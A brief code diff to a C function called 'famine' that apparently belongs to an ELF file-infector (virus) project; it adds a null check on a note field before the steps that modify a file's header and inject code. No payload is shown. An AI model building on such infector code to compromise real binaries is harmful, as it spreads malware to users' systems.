@@ -84,6 +84,12 @@ void famine(char *file)
 	}
 
 	modify_segment(&info);
+	if (info.note == NULL)
+	{
+		release_info(&info);
+		return ;
+	}
+
 	modify_header(&info, header);	
 	inject(&info);
 }
